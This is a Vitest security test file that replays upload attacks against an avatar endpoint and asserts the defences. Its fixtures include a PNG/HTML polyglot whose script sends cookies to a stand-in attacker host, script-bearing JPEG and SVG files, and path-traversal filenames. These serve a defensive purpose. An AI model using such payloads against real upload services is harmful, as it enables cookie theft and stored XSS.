// ROUND-3 EXPLOIT REPLAY — storage abuse via the new avatar upload (POST /api/profile/avatar).
// Incident classes: polyglot files that pass a magic-byte sniff (GIFAR 2008, "PNG+HTML" stored-XSS on
// CDNs), SVG-with-script avatars (GitLab/Grafana/Mattermost CVEs), path traversal in object keys,
// content-binding collisions.
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { NextRequest } from 'next/server'
import { privateKeyToAccount } from 'viem/accounts'
import { createHash } from 'node:crypto'
import { buildProfileAvatarMessage, sniffImageMime, avatarObjectPath, avatarPathFromPublicUrl } from '@/lib/profile/avatarUpload'

const upload = vi.fn(async (..._a: unknown[]) => ({ data: {}, error: null }))
const remove = vi.fn(async (_p: string[]) => ({ data: null, error: null }))
let EXISTING: { address: string; avatar_ref: string | null } | null = null
vi.mock('@/lib/web2/supabase', () => ({
  getServiceClient: () => ({
    storage: {
      from: (bucket: string) => ({
        upload: (path: string, body: unknown, opts: unknown) => upload(bucket, path, body, opts),
        getPublicUrl: (path: string) => ({ data: { publicUrl: `https://proj.supabase.co/storage/v1/object/public/${bucket}/${path}` } }),
        remove: (paths: string[]) => remove(paths),
      }),
    },
    from: () => {
      const chain: Record<string, unknown> = {
        select: () => chain, eq: () => chain,
        maybeSingle: async () => ({ data: EXISTING, error: null }),
        update: () => ({ eq: async () => ({ error: null }) }),
        insert: async () => ({ error: null }),
      }
      return chain
    },
  }),
}))
vi.mock('@/lib/rewards/referral-code', () => ({ generateRefCodeForWallet: async () => 'mw_test' }))

import { POST } from '@/app/api/(web2)/profile/avatar/route'

const owner = privateKeyToAccount('0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d')
const WALLET = owner.address.toLowerCase()
const sha = (b: Uint8Array) => createHash('sha256').update(b).digest('hex')
const enc = new TextEncoder()
const PNG_MAGIC = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]

function polyglotPngHtml(): Uint8Array {
  const html = enc.encode('<html><body><script>fetch("https://attacker.example/?c="+document.cookie)</script></body></html>')
  const b = new Uint8Array(PNG_MAGIC.length + 8 + html.length)
  b.set(PNG_MAGIC); b.set(html, PNG_MAGIC.length + 8)
  return b
}
function jpegWithScriptComment(): Uint8Array {
  const payload = enc.encode('<script>alert(1)</script>')
  const b = new Uint8Array(4 + 2 + payload.length + 32)
  b.set([0xff, 0xd8, 0xff, 0xfe, 0x00, payload.length + 2]); b.set(payload, 6)
  return b
}

async function post(bytes: Uint8Array, opts: { message?: string; sig?: string; declaredType?: string; issuedAt?: number; filename?: string } = {}) {
  const issuedAt = opts.issuedAt ?? Date.now()
  const authMessage = opts.message ?? buildProfileAvatarMessage({ wallet: owner.address, issuedAt, sha256: sha(bytes), size: bytes.length })
  const authSignature = opts.sig ?? (await owner.signMessage({ message: authMessage }))
  const form = new FormData()
  form.set('address', owner.address); form.set('authMessage', authMessage); form.set('authSignature', authSignature); form.set('issuedAt', String(issuedAt))
  form.set('file', new Blob([bytes as BlobPart], { type: opts.declaredType ?? 'image/png' }), opts.filename ?? '../../../etc/passwd.html')
  return POST(new NextRequest('http://localhost/api/profile/avatar', { method: 'POST', body: form }))
}

beforeEach(() => { upload.mockClear(); remove.mockClear(); EXISTING = null })

describe('polyglots — the sniff is a magic-byte PREFIX check only', () => {
  it('EXPLOITABLE-as-storage / MITIGATED-as-XSS: PNG-magic + HTML/JS body is ACCEPTED and stored as image/png', async () => {
    const bytes = polyglotPngHtml()
    expect(sniffImageMime(bytes)).toBe('image/png')
    const res = await post(bytes, { declaredType: 'text/html' })
    expect(res.status).toBe(200)
    expect(upload).toHaveBeenCalledTimes(1)
    const [bucket, path, body, opts] = upload.mock.calls[0] as unknown as [string, string, Uint8Array, { contentType: string }]
    expect(bucket).toBe('avatars')
    expect(opts.contentType).toBe('image/png') // served as image/png → browsers never sniff an image/* body into HTML (MIME sniffing std §7)
    expect(new TextDecoder().decode(body)).toContain('<script>') // the payload IS persisted, on the *.supabase.co origin, not mintware.finance
    expect(path).toMatch(/^0x[0-9a-f]{40}\/[0-9a-f-]{36}\.png$/) // client filename ignored → no traversal, no .html
  })

  it('JPEG with a <script> in a COM segment is accepted (valid JPEG container; renders as image, script inert)', async () => {
    const bytes = jpegWithScriptComment()
    expect(sniffImageMime(bytes)).toBe('image/jpeg')
    const res = await post(bytes)
    expect(res.status).toBe(200)
    expect((upload.mock.calls[0] as unknown as [string, string, Uint8Array, { contentType: string }])[3].contentType).toBe('image/jpeg')
  })

  it('MITIGATED: SVG (xml, plain, BOM, leading whitespace) and HTML are 415 — never stored', async () => {
    for (const s of ['<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>', '<?xml version="1.0"?><svg/>', '﻿<svg/>', '   <svg/>', '<!doctype html><script>1</script>', 'GIF89a' + 'x'.repeat(20)]) {
      const res = await post(enc.encode(s), { declaredType: 'image/png' })
      expect(res.status).toBe(415)
    }
    expect(upload).not.toHaveBeenCalled()
  })

  it('MITIGATED: WebP container check requires both RIFF and WEBP tags (RIFF/WAVE, RIFF/AVI rejected)', () => {
    const riff = (tag: string) => { const b = new Uint8Array(32); b.set(enc.encode('RIFF')); b.set(enc.encode(tag), 8); return b }
    expect(sniffImageMime(riff('WEBP'))).toBe('image/webp')
    expect(sniffImageMime(riff('WAVE'))).toBeNull()
    expect(sniffImageMime(riff('AVI '))).toBeNull()
  })
})

describe('object key + ownership', () => {
  it('MITIGATED: the key is <signer-wallet>/<server uuid>.<sniffed ext> — client filename/address casing/ext are never used', async () => {
    const res = await post(polyglotPngHtml(), { filename: '../../other/../0x' + 'ee'.repeat(20) + '/x.svg' })
    expect(res.status).toBe(200)
    const path = (upload.mock.calls[0] as unknown as [string, string])[1]
    expect(path.startsWith(`${WALLET}/`)).toBe(true)
    expect(path).not.toContain('..')
    expect(avatarObjectPath('0xABCDEF' + '0'.repeat(34), '../../x', 'html')).toBe('0xabcdef' + '0'.repeat(34) + '/../../x.html') // pure helper does NOT sanitise — the route's uuid+ext are the guard
  })

  it('MITIGATED: replacing ANOTHER wallet\'s object is impossible — cleanup only removes keys under the signer\'s own prefix', async () => {
    const victim = '0x' + 'ee'.repeat(20)
    EXISTING = { address: WALLET, avatar_ref: `https://proj.supabase.co/storage/v1/object/public/avatars/${victim}/${'1'.repeat(8)}-1111-1111-1111-${'1'.repeat(12)}.png` }
    vi.stubEnv('NEXT_PUBLIC_SUPABASE_URL', 'https://proj.supabase.co')
    const res = await post(polyglotPngHtml())
    expect(res.status).toBe(200)
    expect(remove).not.toHaveBeenCalled() // victim's object untouched even though OUR row pointed at it
    vi.unstubAllEnvs()
  })

  it('avatarPathFromPublicUrl: foreign bucket / host / traversal never parse (so cleanup can never be steered)', () => {
    const base = 'https://proj.supabase.co'
    expect(avatarPathFromPublicUrl(`${base}/storage/v1/object/public/other/${WALLET}/a.png`, base)).toBeNull()
    expect(avatarPathFromPublicUrl(`https://evil.supabase.co/storage/v1/object/public/avatars/${WALLET}/a.png`, base)).toBeNull()
    expect(avatarPathFromPublicUrl(`${base}/storage/v1/object/public/avatars/${WALLET}/../x.png`, base)).toBeNull()
  })
})

describe('content binding (sha256 + size) and replay', () => {
  it('MITIGATED: both fields are checked — same size/different bytes → 401; same sha/tampered size → 401', async () => {
    const a = polyglotPngHtml()
    const b = new Uint8Array(a); b[b.length - 1] ^= 0xff // same size, different sha
    const issuedAt = Date.now()
    const msgA = buildProfileAvatarMessage({ wallet: owner.address, issuedAt, sha256: sha(a), size: a.length })
    const sigA = await owner.signMessage({ message: msgA })
    expect((await post(b, { message: msgA, sig: sigA, issuedAt })).status).toBe(401)
    const msgWrongSize = buildProfileAvatarMessage({ wallet: owner.address, issuedAt, sha256: sha(a), size: a.length + 1 })
    expect((await post(a, { message: msgWrongSize, sig: await owner.signMessage({ message: msgWrongSize }), issuedAt })).status).toBe(401)
    expect(upload).not.toHaveBeenCalled()
  })

  it('THEORETICAL (Info): no replay set on this route — the SAME signature re-presented inside 15 min uploads the same bytes again (new uuid, old removed; net +0 objects)', async () => {
    const bytes = polyglotPngHtml()
    const issuedAt = Date.now()
    const msg = buildProfileAvatarMessage({ wallet: owner.address, issuedAt, sha256: sha(bytes), size: bytes.length })
    const sig = await owner.signMessage({ message: msg })
    expect((await post(bytes, { message: msg, sig, issuedAt })).status).toBe(200)
    expect((await post(bytes, { message: msg, sig, issuedAt })).status).toBe(200)
    expect(upload).toHaveBeenCalledTimes(2)
  })

  it('size guard: Content-Length is only a fast path — the bytes are measured after full buffering (chunked body relies on the platform 4.5 MB cap)', async () => {
    const big = new Uint8Array(2 * 1024 * 1024 + 1); big.set(PNG_MAGIC)
    const res = await post(big)
    expect(res.status).toBe(413)
    expect(upload).not.toHaveBeenCalled()
  })
})
